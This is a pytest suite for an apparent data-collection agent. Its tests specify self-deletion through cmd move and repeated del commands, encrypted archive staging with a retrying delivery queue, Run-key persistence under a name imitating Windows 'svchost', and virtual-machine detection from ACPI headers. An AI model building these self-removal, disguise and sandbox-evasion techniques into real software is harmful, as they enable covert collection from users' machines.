"""Filesystem helpers."""

from __future__ import annotations

import os
import sys
import zipfile
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import util, winapi  # noqa: E402


class Spawned:
    """Stands in for Popen, so the line can be inspected without running it."""

    def __init__(self) -> None:
        self.calls: list[object] = []

    def __call__(self, command: object, **_: object) -> object:
        self.calls.append(command)

        class Handle:
            pass

        return Handle()


def command_for(monkeypatch: pytest.MonkeyPatch, target: Path) -> str:
    spawned = Spawned()
    monkeypatch.setattr(util.subprocess, "Popen", spawned)
    util.self_remove(target)
    assert spawned.calls, "self_remove spawned nothing"
    return str(spawned.calls[0])


def test_the_command_is_one_string_not_an_argv_list(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # subprocess re-quotes a list for CreateProcess and escapes the path's quotes with
    # backslashes. cmd does not read those as escapes, so the delete ran against a
    # mangled path and failed while every layer above reported success. Measured on a
    # real artifact that survived its own removal.
    spawned = Spawned()
    monkeypatch.setattr(util.subprocess, "Popen", spawned)
    util.self_remove(Path(r"C:\x\sable.exe"))
    assert isinstance(spawned.calls[0], str)


def test_the_target_is_quoted(monkeypatch: pytest.MonkeyPatch) -> None:
    # A username with a space is not an edge case.
    target = Path(r"C:\Users\Bench User\Desktop\sable.exe")
    assert f'"{target}"' in command_for(monkeypatch, target)


def test_a_move_is_tried_before_the_delete(monkeypatch: pytest.MonkeyPatch) -> None:
    # Renaming a running image is permitted where deleting it is not.
    command = command_for(monkeypatch, Path(r"C:\x\sable.exe"))
    assert command.index("move /y") < command.index("del /f /q")


def test_the_delete_is_attempted_more_than_once(monkeypatch: pytest.MonkeyPatch) -> None:
    command = command_for(monkeypatch, Path(r"C:\x\sable.exe"))
    assert command.count("del /f /q") >= 2
    assert "ping" in command


def test_a_path_with_a_quote_is_refused_rather_than_escaped(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    spawned = Spawned()
    monkeypatch.setattr(util.subprocess, "Popen", spawned)
    util.self_remove(Path('C:\\x\\sa"ble.exe'))
    assert spawned.calls == []


# --- local copy -------------------------------------------------------------


def test_keep_archive_copies_under_a_findable_name(tmp_path: Path) -> None:
    source = tmp_path / "payload.zip"
    source.write_bytes(b"PK\x03\x04sable")
    base = tmp_path / "Sable Results"

    kept = util.keep_archive(source, "DESKTOP-ABC", base=base)
    assert kept is not None
    assert kept.parent == base
    assert kept.name.startswith("DESKTOP-ABC_")
    assert kept.suffix == ".zip"
    assert kept.read_bytes() == source.read_bytes()


def test_keep_archive_cleans_an_illegal_label(tmp_path: Path) -> None:
    source = tmp_path / "payload.zip"
    source.write_bytes(b"x")

    kept = util.keep_archive(source, "bad/name:*?", base=tmp_path)
    assert kept is not None
    for character in '/:*?"<>|':
        assert character not in kept.name


def test_keep_archive_never_raises_when_the_folder_is_a_file(tmp_path: Path) -> None:
    source = tmp_path / "payload.zip"
    source.write_bytes(b"x")
    blocker = tmp_path / "blocked"
    blocker.write_bytes(b"not a folder")

    assert util.keep_archive(source, "BOX", base=blocker) is None


def test_two_copies_in_one_second_do_not_overwrite(tmp_path: Path) -> None:
    source = tmp_path / "payload.zip"
    source.write_bytes(b"x")

    first = util.keep_archive(source, "BOX", base=tmp_path)
    second = util.keep_archive(source, "BOX", base=tmp_path)
    assert first is not None and second is not None
    assert first != second


def test_write_text_creates_the_folder(tmp_path: Path) -> None:
    target = tmp_path / "deep" / "summary.txt"
    assert util.write_text(target, "hello") is True
    assert target.read_text(encoding="utf-8") == "hello"


# --- archive writer ---------------------------------------------------------


def test_a_member_larger_than_one_chunk_survives_the_streamed_write(
    tmp_path: Path,
) -> None:
    # The writer streams each file instead of reading it into bytes first, so the case
    # worth pinning is a member that spans several blocks: it has to arrive whole and
    # the central directory has to carry a matching checksum.
    tree = tmp_path / "tree"
    tree.mkdir()
    payload = os.urandom(3 * 1024 * 1024 + 17)
    (tree / "big.bin").write_bytes(payload)

    archive = util.make_archive(tree, tmp_path / "out.zip")

    assert archive is not None
    with zipfile.ZipFile(archive) as opened:
        assert opened.testzip() is None, "a streamed member failed its own crc"
        assert opened.read("big.bin") == payload


# --- encrypted archive ------------------------------------------------------


def sample_archive(folder: Path) -> Path:
    import zipfile

    path = folder / "payload.zip"
    with zipfile.ZipFile(path, "w") as bundle:
        bundle.writestr("hello.txt", "the quick brown fox " * 40)
        bundle.writestr("nested/binary.bin", bytes(range(256)) * 8)
        bundle.writestr("empty.txt", "")
    return path


def test_sealed_archive_is_a_zip_that_declares_aes(tmp_path: Path) -> None:
    import zipfile

    source = sample_archive(tmp_path)
    sealed = util.seal_zip(source, tmp_path / "sealed.zip", "bench-key")
    assert sealed is not None

    with zipfile.ZipFile(sealed) as bundle:
        infos = bundle.infolist()
    assert len(infos) == 3
    for info in infos:
        assert info.compress_type == 99, "AES entries declare method 99"
        assert info.flag_bits & 0x0001, "the encrypted flag is set"
        assert info.CRC == 0, "AE-2 stores no CRC"
        assert b"AE" in info.extra, "the 0x9901 extra field names the vendor"


def test_the_same_archive_seals_differently_every_time(tmp_path: Path) -> None:
    import zipfile

    source = sample_archive(tmp_path)
    first = util.seal_zip(source, tmp_path / "one.zip", "bench-key")
    second = util.seal_zip(source, tmp_path / "two.zip", "bench-key")
    assert first is not None and second is not None
    assert first.read_bytes() != second.read_bytes(), "hiding salt is fresh per entry"

    with zipfile.ZipFile(source) as original, zipfile.ZipFile(first) as bundle:
        assert bundle.namelist() == original.namelist()


def test_sealing_without_a_password_is_refused(tmp_path: Path) -> None:
    source = sample_archive(tmp_path)
    assert util.seal_zip(source, tmp_path / "sealed.zip", "") is None


def test_sealing_a_missing_file_returns_none_instead_of_raising(tmp_path: Path) -> None:
    assert util.seal_zip(tmp_path / "gone.zip", tmp_path / "out.zip", "k") is None


def test_sealing_keeps_the_plain_archive_untouched(tmp_path: Path) -> None:
    source = sample_archive(tmp_path)
    before = source.read_bytes()
    assert util.seal_zip(source, tmp_path / "sealed.zip", "bench-key") is not None
    assert source.read_bytes() == before


# --- delivery queue ---------------------------------------------------------


def parked_folder(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
    folder = tmp_path / "queue"
    monkeypatch.setattr(util, "_QUEUE_ROOT", folder)
    return folder


def test_parking_keeps_a_copy_and_journals_it(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    folder = parked_folder(monkeypatch, tmp_path)
    source = tmp_path / "payload.zip"
    source.write_bytes(b"x" * 4096)

    parked = util.park_archive(source)

    assert parked is not None and parked.is_file()
    assert parked.parent == folder / "pending"
    assert source.is_file(), "parking copies, it never moves"
    assert parked.read_bytes() == source.read_bytes()

    note = util.read_json(parked.with_suffix(".json"))
    assert note["archive"] == parked.name
    assert note["bytes"] == 4096
    assert note["attempts"] == 0


def test_a_parked_archive_is_listed_until_it_is_dropped(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    parked_folder(monkeypatch, tmp_path)
    source = tmp_path / "payload.zip"
    source.write_bytes(b"x" * 128)

    parked = util.park_archive(source)
    assert parked is not None
    assert util.pending_queue() == [parked]

    util.drop_pending(parked)
    assert util.pending_queue() == []
    assert not parked.exists()
    assert not parked.with_suffix(".json").exists()


def test_dropping_a_journal_that_is_a_folder_does_not_raise(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # The trim loop calls this *after* a new archive has been parked and journalled, so
    # an exception here used to escape into park_archive's handler and report that
    # nothing had been parked while the archive sat on disk with no retry task.
    folder = parked_folder(monkeypatch, tmp_path)
    parked = folder / "pending" / "stuck.zip"
    parked.parent.mkdir(parents=True)
    parked.write_bytes(b"x")
    journal = parked.with_suffix(".json")
    journal.mkdir()
    (journal / "held.txt").write_text("a directory where a file belongs", encoding="utf-8")

    util.drop_pending(parked)

    assert not parked.exists()


def test_a_journal_with_an_unreadable_count_still_counts(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # The journal is a file on a machine this run does not control. A string where the
    # count belongs used to raise out of bump_pending, which is called from the handler
    # that is already reporting a failed delivery.
    parked_folder(monkeypatch, tmp_path)
    source = tmp_path / "payload.zip"
    source.write_bytes(b"x" * 64)
    parked = util.park_archive(source)
    assert parked is not None
    util.write_json(
        parked.with_suffix(".json"), {"archive": parked.name, "attempts": "lots"}
    )

    assert util.bump_pending(parked) == 1
    assert util.read_json(parked.with_suffix(".json"))["attempts"] == 1


def test_a_zip_without_a_journal_is_not_trusted(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    folder = parked_folder(monkeypatch, tmp_path)
    stray = folder / "pending" / "orphan.zip"
    stray.parent.mkdir(parents=True)
    stray.write_bytes(b"z" * 32)

    assert util.pending_queue() == [], "an entry with no journal is half a record"


def test_parking_a_file_that_is_not_there_returns_none(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    parked_folder(monkeypatch, tmp_path)
    assert util.park_archive(tmp_path / "gone.zip") is None


def test_the_journal_count_moves(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    parked_folder(monkeypatch, tmp_path)
    source = tmp_path / "payload.zip"
    source.write_bytes(b"x" * 64)
    parked = util.park_archive(source)
    assert parked is not None

    assert util.bump_pending(parked) == 1
    assert util.bump_pending(parked) == 2
    note = util.read_json(parked.with_suffix(".json"))
    assert note["attempts"] == 2
    assert "last_try" in note


def test_the_queue_is_capped_and_drops_the_oldest(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    parked_folder(monkeypatch, tmp_path)
    made: list[Path] = []
    for index in range(util.MAX_PENDING + 2):
        source = tmp_path / f"src{index}.zip"
        source.write_bytes(b"y" * (index + 1))
        item = util.park_archive(source)
        assert item is not None
        # Explicit times: a tight loop writes the same millisecond twice and the trim
        # would then be choosing between equals.
        os.utime(item, (1_000_000 + index, 1_000_000 + index))
        made.append(item)

    remaining = util.pending_queue()
    assert len(remaining) == util.MAX_PENDING
    assert made[0] not in remaining, "the oldest goes first when the cap is reached"
    assert made[-1] in remaining


def test_the_retry_task_is_created_with_the_flag_and_a_day_limit(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    seen: dict[str, list[str]] = {}

    def fake(arguments: list[str]) -> bool:
        seen["args"] = arguments
        return True

    monkeypatch.setattr(util, "_schtasks", fake)
    image = tmp_path / "a.exe"
    assert util.schedule_retry(image) is True

    arguments = seen["args"]
    assert arguments[arguments.index("/tn") + 1] == "DeliveryQueue"
    assert arguments[arguments.index("/tr") + 1] == f'"{image}" --retry'
    assert arguments[arguments.index("/du") + 1] == "024:00"
    assert arguments[arguments.index("/sc") + 1] == "minute"


def test_scheduling_refuses_a_path_with_a_quote_in_it() -> None:
    assert util.schedule_retry(Path('C:\\odd"name.exe')) is False


# --- persistence ------------------------------------------------------------


def staged_folder(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> Path:
    folder = tmp_path / "local" / "Programs" / "WinSvcHost"
    monkeypatch.setattr(util, "_PERSIST_ROOT", folder)
    return folder


def record_tasks(monkeypatch: pytest.MonkeyPatch, verdict: bool = True) -> list[list[str]]:
    calls: list[list[str]] = []

    def fake(arguments: list[str]) -> bool:
        calls.append(arguments)
        return verdict

    monkeypatch.setattr(util, "_schtasks", fake)
    return calls


def record_run_key(
    monkeypatch: pytest.MonkeyPatch, verdict: bool = True
) -> list[tuple[int, str, str, str]]:
    """Writes to the logon Run key, separated from the Add/Remove Programs record.

    Both go through ``registry_set_string``. A test that counted every call would be
    asserting the *shape* of the whole install when it means to assert one value, so the
    Run key is filtered out by subkey and the rest is available to ``record_arp``.
    """
    calls: list[tuple[int, str, str, str]] = []

    def fake(root: int, subkey: str, name: str, data: str) -> bool:
        if subkey.endswith("\\Run"):
            calls.append((root, subkey, name, data))
        return verdict

    monkeypatch.setattr(util.winapi, "registry_set_string", fake)
    return calls


def record_arp(monkeypatch: pytest.MonkeyPatch) -> list[dict[str, object]]:
    """The Add/Remove Programs record, captured instead of written.

    Patched on the module rather than through ``winapi`` because the real call would
    create a key under HKCU on whatever machine runs the suite. A test that passes by
    writing to the developer's registry is not a test.
    """
    from agent import install

    calls: list[dict[str, object]] = []

    def fake(destination: Path, **kwargs: object) -> bool:
        calls.append({"destination": destination, **kwargs})
        return True

    monkeypatch.setattr(install, "register", fake)
    return calls


def test_persistence_stages_the_image_and_hooks_logon(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    folder = staged_folder(monkeypatch, tmp_path)
    run_key = record_run_key(monkeypatch)
    record_tasks(monkeypatch)
    arp = record_arp(monkeypatch)

    image = tmp_path / "artifact.exe"
    image.write_bytes(b"MZ" + bytes(1024))

    staged = util.install_persistence(image, 0)

    assert staged == folder / "winsvchost.exe"
    assert staged is not None and staged.is_file()
    assert staged.read_bytes() == image.read_bytes()
    assert image.is_file(), "staging copies, it never moves"

    assert len(run_key) == 1
    root, subkey, name, data = run_key[0]
    assert root == util.winapi.HKEY_CURRENT_USER
    assert subkey == r"Software\Microsoft\Windows\CurrentVersion\Run"
    assert name == "WinSvcHost"
    assert data == f'"{staged}"', "quoted, or a path with a space breaks at logon"

    # One folder, one removal path. The record names the same folder the Run value runs
    # out of, and the command it stores is the script written beside the image.
    assert len(arp) == 1
    assert arp[0]["destination"] == folder
    assert str(folder / "uninstall.cmd") in str(arp[0]["uninstall_command"])
    assert (folder / "uninstall.cmd").is_file()


def test_a_run_key_that_cannot_be_written_is_a_failure_not_a_success(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    staged_folder(monkeypatch, tmp_path)
    record_run_key(monkeypatch, verdict=False)
    record_tasks(monkeypatch)

    image = tmp_path / "artifact.exe"
    image.write_bytes(b"MZ")

    assert util.install_persistence(image, 0) is None


def test_an_unregistered_copy_is_not_left_on_the_disk(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    # Nothing runs a staged image with no Run value and no task, and no cleanup path
    # knows about it. A failure has to leave the profile as it found it.
    folder = staged_folder(monkeypatch, tmp_path)
    record_run_key(monkeypatch, verdict=False)
    record_tasks(monkeypatch)

    image = tmp_path / "artifact.exe"
    image.write_bytes(b"MZ" + bytes(256))

    assert util.install_persistence(image, 0) is None
    assert not (folder / "winsvchost.exe").exists()


def test_the_task_tool_is_named_by_absolute_path(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # An elevated run that resolves "schtasks" off PATH runs whatever the target put
    # there. The name has to be a full path to the system copy.
    seen: list[list[str]] = []

    class Done:
        returncode = 0
        stderr = b""

    def fake(argv: list[str], **_: object) -> Done:
        seen.append(argv)
        return Done()

    monkeypatch.setattr(util.subprocess, "run", fake)

    assert util._schtasks(["/query"]) is True
    assert seen, "the tool was never launched"
    assert os.path.isabs(seen[0][0]), seen[0][0]
    assert seen[0][0].lower().endswith("schtasks.exe"), seen[0][0]


def test_persistence_adds_a_timer_when_hours_are_set(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    staged_folder(monkeypatch, tmp_path)
    record_run_key(monkeypatch)
    calls = record_tasks(monkeypatch)

    image = tmp_path / "artifact.exe"
    image.write_bytes(b"MZ")
    assert util.install_persistence(image, 6) is not None

    names = [call[call.index("/tn") + 1] for call in calls]
    assert names == ["WinSvcHostTimer"]
    timer = calls[0]
    assert timer[timer.index("/sc") + 1] == "hourly"
    assert timer[timer.index("/mo") + 1] == "6"


def test_a_full_day_of_hours_becomes_a_daily_task(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    staged_folder(monkeypatch, tmp_path)
    record_run_key(monkeypatch)
    calls = record_tasks(monkeypatch)

    image = tmp_path / "artifact.exe"
    image.write_bytes(b"MZ")
    assert util.install_persistence(image, 24) is not None

    timer = calls[0]
    assert timer[timer.index("/sc") + 1] == "daily", "hourly stops at 23"
    assert timer[timer.index("/mo") + 1] == "1"


def test_without_hours_a_stale_timer_is_removed(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    staged_folder(monkeypatch, tmp_path)
    record_run_key(monkeypatch)
    calls = record_tasks(monkeypatch)

    image = tmp_path / "artifact.exe"
    image.write_bytes(b"MZ")
    assert util.install_persistence(image, 0) is not None

    assert calls[0][0] == "/delete"
    assert calls[0][calls[0].index("/tn") + 1] == "WinSvcHostTimer"


def test_persistence_does_not_copy_itself_onto_itself(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    folder = staged_folder(monkeypatch, tmp_path)
    record_run_key(monkeypatch)
    record_tasks(monkeypatch)

    target = folder / "winsvchost.exe"
    target.parent.mkdir(parents=True)
    target.write_bytes(b"MZ" + bytes(32))

    assert util.install_persistence(target, 0) == target


def test_persistence_refuses_a_path_with_a_quote_in_it(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    staged_folder(monkeypatch, tmp_path)
    record_run_key(monkeypatch)
    record_tasks(monkeypatch)
    assert util.install_persistence(Path('C:\\odd"name.exe'), 0) is None


# --- firmware headers -------------------------------------------------------


def acpi_header(oem_id: bytes, oem_table: bytes) -> bytes:
    """A 36-byte ACPI header with the two OEM fields filled and nothing else real."""
    header = bytearray(b"SSDT" + bytes(32))
    header[0x0A:0x10] = oem_id.ljust(6, b"\x00")
    header[0x10:0x18] = oem_table.ljust(8, b"\x00")
    return bytes(header)


def test_acpi_reads_the_oem_fields_at_their_real_offsets() -> None:
    # OEMID is at 0x0A and the table id at 0x10. Reading at 0x10 and 0x18 finds the
    # table id and then the revision integer, so a VMware guest reports neither
    # "VMWARE" nor its own table name and the gate loses a check it already paid for.
    found = winapi._acpi_header_strings(acpi_header(b"VMWARE", b"VMWTTBL1"))
    assert found == ["VMWARE", "VMWTTBL1"]


def test_acpi_ignores_a_table_shorter_than_its_header() -> None:
    assert winapi._acpi_header_strings(b"SSDT" + bytes(8)) == []


def test_acpi_drops_fields_that_are_only_padding() -> None:
    assert winapi._acpi_header_strings(acpi_header(b"\x00" * 6, b"   \x00\x00\x00")) == []

# --- request pacing ----------------------------------------------------------


def test_no_wait_before_the_first_request() -> None:
    assert util.paced_delay(0) == 0.0
    assert util.paced_delay(-3) == 0.0


def test_the_wait_grows_linearly_and_stops_at_the_cap() -> None:
    def no_jitter(low: float, high: float) -> float:
        assert low < 0 < high
        return 0.0

    assert util.paced_delay(1, uniform=no_jitter) == util.PACE_BASE
    assert util.paced_delay(2, uniform=no_jitter) == util.PACE_BASE + util.PACE_STEP
    assert util.paced_delay(50, uniform=no_jitter) == util.PACE_CAP


def test_jitter_is_a_fraction_of_the_wait_not_a_fixed_number() -> None:
    """So the spread scales with the delay. A fixed second of jitter would dominate a
    half-second base and vanish inside a two-second wait."""

    def lowest(low: float, high: float) -> float:
        return low

    def highest(low: float, high: float) -> float:
        return high

    for index in (1, 4, 20):
        low = util.paced_delay(index, uniform=lowest)
        high = util.paced_delay(index, uniform=highest)
        base = util.paced_delay(index, jitter=0.0)
        assert low < base < high
        assert low >= 0.0


def test_pacing_can_be_switched_off_entirely() -> None:
    assert util.paced_delay(9, jitter=0.0) == util.PACE_CAP


def test_paced_sleep_waits_what_it_returns_and_never_waits_negative() -> None:
    slept: list[float] = []
    waited = util.paced_sleep(1, sleep=slept.append, uniform=lambda low, high: low)
    assert waited == slept[0]
    assert waited >= 0

    slept.clear()
    assert util.paced_sleep(0, sleep=slept.append) == 0.0
    assert slept == []
